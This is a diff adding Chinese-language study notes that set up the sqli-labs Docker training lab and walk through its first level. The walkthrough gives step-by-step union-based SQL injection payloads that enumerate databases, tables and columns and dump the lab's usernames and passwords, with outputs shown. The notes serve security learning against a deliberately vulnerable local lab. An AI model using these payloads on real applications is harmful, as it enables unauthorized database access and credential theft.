@@ -151,3 +151,99 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 ```
+
+---
+………………分割线………………  
+
+## sqli-labs
+
+决定用 [https://hub.docker.com/r/acgpiano/sqli-labs/](https://hub.docker.com/r/acgpiano/sqli-labs/) ssqli-labs 的 docker 镜像来系统性的学 sql 注入。  
+
+``` bash
+docker run -d --name sqli-labs -p 8080:80 acgpiano/sqli-labs
+```
+
+就是这样，然后外部用 8080 端口的 http 访问。  
+```
+http://localhost:8080/
+```
+
+不行的就检查 docker 的端口是否正常打开：  
+```
+❯ docker port sqli-labs
+80/tcp -> 0.0.0.0:8080
+80/tcp -> [::]:8080
+```
+
+### less-1
+ Please input the ID as parameter with numeric value  
+要求用 id  GET 请求传参。  
+
+```
+?id=1' '1' or '1
+```
+能行说明是字符型。然后 order by 发现是 3 列。  
+
+```
+?id=1' order by 3 -- -
+```
+
+到 order by 4 就报错了。  
+
+接下来 `?id=-1' union select 1, 2, 3-- -` 确定是 3 列，输出 2, 3。  
+获取用户名、数据库、版本号：  
+
+```
+?id=-1' union select 1, 2, (select group_concat(user(), database(), version()))-- -
+```
+输出：  
+```
+Your Login name:2
+Your Password:root@localhostsecurity5.5.44-0ubuntu0.14.04.1
+```
+
+获取所有数据库名：  
+
+```
+?id=-1' union select 1, 2, (select group_concat(schema_name) from information_schema.schemata)-- -
+```
+输出：  
+```
+Your Login name:2
+Your Password:information_schema,challenges,mysql,performance_schema,security
+```
+
+获取 security 所有表名：  
+```
+?id=-1' union select 1, 2, (select group_concat(table_name) from information_schema.tables where table_schema='security')-- -
+```
+
+输出：
+```
+Your Password:emails,referers,uagents,users
+```
+
+
+获取 users 所有列名：  
+```
+?id=-1' union select 1, 2, (select group_concat(column_name) from information_schema.columns where table_name='users')-- -
+```
+
+输出：  
+```
+Your Login name:2
+Your Password:id,username,password
+```
+
+获取 users 表中的 username 列和 password 列：  
+```
+?id=-1' union select 1, (select group_concat(username) from security.users), (select group_concat(password) from security.users)-- -
+```
+
+输出：  
+```
+ Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
+Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
+```
+
+这样就拿到所有用户密码，基础注入点测试。    
